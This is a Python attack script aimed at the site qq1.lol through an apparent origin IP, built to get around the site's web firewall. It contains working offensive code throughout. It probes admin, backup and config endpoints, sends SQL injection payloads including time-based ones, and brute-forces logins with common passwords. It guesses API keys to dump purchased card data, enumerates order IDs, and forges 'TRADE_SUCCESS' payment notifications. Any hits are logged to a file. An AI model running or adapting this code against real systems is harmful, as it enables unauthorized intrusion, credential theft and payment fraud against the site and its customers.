#!/usr/bin/env python3
"""qq1.lol origin IP WAF bypass deep probe — ajax/sup/user/install via 45.158.21.213"""
import json
import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

HOST = "qq1.lol"
BASE = f"https://{HOST}"
IP = os.environ.get("QQ1_ORIGIN", "45.158.21.213")
ORIGIN = f"https://{IP}"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "ip_bypass.log"
HITS = OUT / "ip_bypass_hits.jsonl"
JAR = str(OUT / ".ip_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
TIMEOUT = "15"


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:5000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def curl(path, method="GET", post=None, referer=None):
    url = f"{ORIGIN}/{path.lstrip('/')}"
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA,
           "-H", f"Host: {HOST}", "-H", f"Referer: {referer or BASE + '/'}"]
    if method == "POST":
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if post:
            cmd += ["-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 5).stdout.strip()
    except Exception as e:
        return f"err:{e}"


def get_csrf(page="/"):
    body = curl(page)
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', body)
    return m.group(1) if m else ""


def get_hashsalt():
    body = curl("/?mod=buy&cid=14&tid=131")
    m = re.search(r"var hashsalt=(.+);", body)
    if not m:
        return ""
    return subprocess.run(
        ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
        capture_output=True, text=True, timeout=5,
    ).stdout.strip()


def test_ajax_acts():
    log("=== ajax acts via IP ===")
    acts = [
        "getcount", "getclass", "gettoolnew", "getleftcount", "checklogin",
        "cart_list", "cart_info", "query", "order", "captcha", "gift_start",
        "login", "reg", "userinfo", "pay", "notify", "getorder", "orderlist",
        "getuser", "recharge", "admin", "siteinfo", "getconfig", "export",
        "download", "backup", "upload", "config", "toollogs",
    ]
    for act in acts:
        body = curl(f"ajax.php?act={act}")
        if body and len(body) > 20:
            log(f"  {act}: {body[:120]}")
            if '"code":0' in body and act not in ("getcount", "getclass", "gettoolnew", "checklogin"):
                hit("ajax_ip", act, body)
        body2 = curl(f"ajax.php?act={act}", "POST", "page=1&limit=100&id=1")
        if body2 and '"code":0' in body2 and body2 != body:
            hit("ajax_ip_post", act, body2)


def test_sqli():
    log("=== SQLi via IP ===")
    payloads = [
        "1'", "1' OR '1'='1", "1' AND SLEEP(3)--", "1' UNION SELECT 1,2,3--",
        "20260720145603146' OR '1'='1", "13800138000' OR 1=1--",
        "1; WAITFOR DELAY '0:0:3'--", "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--",
    ]
    for p in payloads:
        t0 = time.time()
        body = curl("ajax.php?act=query", "POST", f"data={quote(p)}")
        elapsed = time.time() - t0
        if elapsed > 2.5:
            hit("sqli_time", p, f"elapsed={elapsed:.1f}s body={body[:200]}")
        if body and ("error" in body.lower() or "sql" in body.lower() or "syntax" in body.lower()):
            hit("sqli_error", p, body)
        if body and '"code":0' in body:
            hit("sqli_query", p, body)


def test_login_brute():
    log("=== login brute via IP (no WAF) ===")
    users = ["admin", "buyi", "buyiq", "root", "test", "sup", "qq1"]
    pwds = ["admin", "123456", "buyi123", "buyi888", "888888", "qq1", "password", "admin123"]
    for user in users:
        for pwd in pwds:
            for ep in ("ajax.php?act=login", "user/ajax.php?act=login", "sup/ajax.php?act=login"):
                body = curl(ep, "POST", f"user={user}&pass={pwd}")
                if body and '"code":0' in body:
                    hit("login", f"{ep} {user}:{pwd}", body)
                elif body and "密码" in body and "验证" not in body:
                    log(f"  cred {ep} {user}:{pwd} -> {body[:80]}")


def test_api_keys():
    log("=== API keys via IP ===")
    keys = ["qq1", "buyi", "buyiq", "kln166", "fffzz", "hmjf", "htqq", "qw123",
            "mckuai", "rainbow", "faka", "admin", "123456", "secret", "830603"]
    for key in keys:
        body = curl(f"%61pi.php?act=search&id=25943&key={quote(key)}")
        if body and "请提供" not in body and ('"code":0' in body or "kminfo" in body):
            hit("api_key_ip", key, body)
        for oid in (25943, 25942, 1):
            body2 = curl(f"%61pi.php?act=search&id={oid}&key={quote(key)}")
            if body2 and "kminfo" in body2:
                hit("api_dump_ip", f"id={oid} key={key}", body2)


def test_pay_order():
    log("=== pay/order via IP ===")
    hs = get_hashsalt()
    csrf = get_csrf("/?mod=buy&cid=14&tid=131")
    if hs:
        body = curl("ajax.php?act=pay", "POST",
                    f"tid=131&num=1&inputvalue=13800138000&hashsalt={hs}&csrf_token={csrf}")
        log(f"  pay: {body[:200]}")
        if body and '"code":0' in body:
            hit("pay_ip", "pay", body)
    for oid in range(25935, 25944):
        for sk in ("", str(oid), "test"):
            body = curl("ajax.php?act=order", "POST", f"id={oid}&skey={sk}")
            if body and "kminfo" in body:
                hit("order_ip", f"id={oid} skey={sk}", body)


def test_getshop_notify():
    log("=== getshop/notify via IP ===")
    for tn in ("20260720145603146", "20260720215518263", "20260720215519140"):
        body = curl(f"other/getshop.php?trade_no={tn}")
        log(f"  getshop {tn}: {body[:120]}")
        if body and "kminfo" in body:
            hit("getshop_ip", tn, body)
    for ep in ("other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"):
        body = curl(ep, "POST", "trade_no=20260720145603146&trade_status=TRADE_SUCCESS&money=99")
        if body and body.lower() in ("ok", "success"):
            hit("notify_ip", ep, body)


def main():
    log(f"=== IP BYPASS PROBE {IP} Host:{HOST} ===")
    curl("/")
    body = curl("ajax.php?act=getcount")
    log(f"getcount: {body[:200]}")
    test_ajax_acts()
    test_sqli()
    test_login_brute()
    test_api_keys()
    test_pay_order()
    test_getshop_notify()
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== DONE hits={n} ===")


if __name__ == "__main__":
    main()
